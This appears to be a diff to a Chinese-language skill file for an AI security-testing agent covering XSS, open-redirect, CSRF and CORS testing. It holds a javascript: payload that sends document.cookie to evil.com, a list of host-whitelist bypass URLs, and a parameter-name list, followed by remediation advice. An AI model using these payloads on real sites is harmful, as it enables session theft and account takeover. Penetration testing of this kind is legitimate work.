@@ -1,6 +1,6 @@
 ---
 name: xss-frontend-security
-description: 当目标存在评论/昵称/富文本/私信/工单/搜索反射/Markdown解析/AI输出渲染/前端DOM操作/postMessage/跨域配置等功能时调用。负责反射型/存储型/DOM XSS、AI/Markdown 渲染型存储 XSS、CSRF、CORS错误配置、Clickjacking 的深度挖掘与绕过。命中跳转页/开放重定向/target 参数驱动 location 跳转时优先测试跳转型 XSS（伪协议升级同源 XSS）；命中 AI 对话/分享页 marked 渲染无净化时测 AI 输出型存储 XSS。
+description: 当目标存在评论/昵称/富文本/私信/工单/搜索反射/Markdown解析/AI输出渲染/前端DOM操作/postMessage/跨域配置等功能时调用。负责反射型/存储型/DOM XSS、AI/Markdown 渲染型存储 XSS、CSRF、CORS错误配置、Clickjacking 的深度挖掘与绕过。命中跳转页/开放重定向/target 参数驱动 location 跳转时优先测试跳转型 XSS（伪协议升级同源 XSS；仅 http(s) 放行时按 3.2 L3 与 3.4 评估开放重定向单独成洞）；命中 AI 对话/分享页 marked 渲染无净化时测 AI 输出型存储 XSS。
 ---
 
 # xss-frontend-security — XSS 与前端安全专项深度挖掘
@@ -61,7 +61,7 @@ description: 当目标存在评论/昵称/富文本/私信/工单/搜索反射/M
 - 正则扫 JS bundle 的 location 赋值点：`location.href =`、`location.replace()`、`location.assign()`、`window.open()`、`location.hash`、`window.location =`
 - 赋值右侧来源：`URLSearchParams(location.search).get(...)`、`getQueryString`、`decodeURIComponent(...)`、路由/状态参数
 - 参数名黑名单：`target / redirect / redirect_uri / returnUrl / back / next / url / uri / link / goto / jump / to / callback / service / continue / forward`
-- 高发位置：登录回跳、SSO 回调、分享邀请、支付回调、扫码登录、**跨端中间页（Taro 的 taro-middle、uni-app 的 redirect 页）**——跨端逻辑常直接把参数透传给 location
+- 高发位置：登录回跳、SSO 回调、分享邀请、支付回调、扫码登录、邮件/短信激活链接、**跨端中间页（Taro 的 taro-middle、uni-app 的 redirect 页）**——跨端逻辑常直接把参数透传给 location
 - 前端框架注意：Vue/React router query、Taro.navigateTo/redirectTo、小程序参数透传
 
 ### 3.2 三级递进测试（每个跳转点必须测到底，不能停在 L1）
@@ -97,11 +97,22 @@ javascript:window['location']='https://evil.com/?c='+document.cookie
 javascript:String.fromCharCode(...)          （敏感词整体拼码）
 ```
 
+**Host 白名单绕过**（过滤器按域名校验时，L2 之前先过一遍）：
+```
+https://trusted.com.evil.com              （后缀伪装）
+https://evil.com/trusted.com              （路径伪装）
+https://trusted.com@evil.com              （@ 认证段混淆）
+https://evil.com#trusted.com              （# 截断）
+https://evil.com?trusted.com              （? 截断）
+https:///evil.com / http:https://evil.com （协议双写/混淆）
+```
+
 ### 3.4 危害评估要点
 
 - **Cookie HttpOnly 属性决定等级**：DevTools Application 面板查看，非 HttpOnly 的会话凭证（serviceToken/userId 类）→ 高危；全 HttpOnly → 降级为钓鱼/CSRF 面
 - **浏览器兼容性**：Chrome 允许 location 赋值执行 javascript: URL（可用）；Firefox 87+ 禁止 top-frame javascript: URL 导航（PoC 需标注浏览器与版本）
 - **SSO/OAuth 回调场景**：跳转携带 code/token 时，仅 http(s) 开放重定向也可外带授权数据，单独成洞
+- **跳转前的登录态校验**：中间跳转页若不校验登录态且可被强制导向钓鱼登录页，可判严重（大范围账号接管面）
 - 同源 XSS 的额外价值：同源请求直接带 Cookie 打接口、渲染钓鱼页、写 localStorage 凭证、配合站内 JSONP
 
 ## 四、AI / Markdown 渲染型存储 XSS 专项
@@ -207,6 +218,6 @@ HTML实体：&#60;script&#62;
 - 富文本使用白名单解析器
 - CSRF：Token + SameSite + 敏感操作二次确认
 - CORS：严格白名单，禁止反射 Origin 与通配符+凭证
-- **跳转目标协议白名单（仅 http/https）+ Host 白名单**；用 `new URL(target)` 解析后校验 scheme 与 hostname（注意 `new URL('javascript://x/')` 的 scheme 是 `javascript`，可拦截伪协议）
+- **跳转目标协议白名单（仅 http/https）+ Host 白名单**；用 `new URL(target)` 解析后校验 scheme 与 hostname（注意 `new URL('javascript://x/')` 的 scheme 是 `javascript`，可拦截伪协议）；跳转参数改用服务端映射（id→url 白名单）；OAuth `redirect_uri` 必须全匹配，不支持子域/路径前缀绕过
 - **会话 Cookie 加 HttpOnly**，降低 JS 读取风险
 - 全站排查同类中间跳转页，统一修复
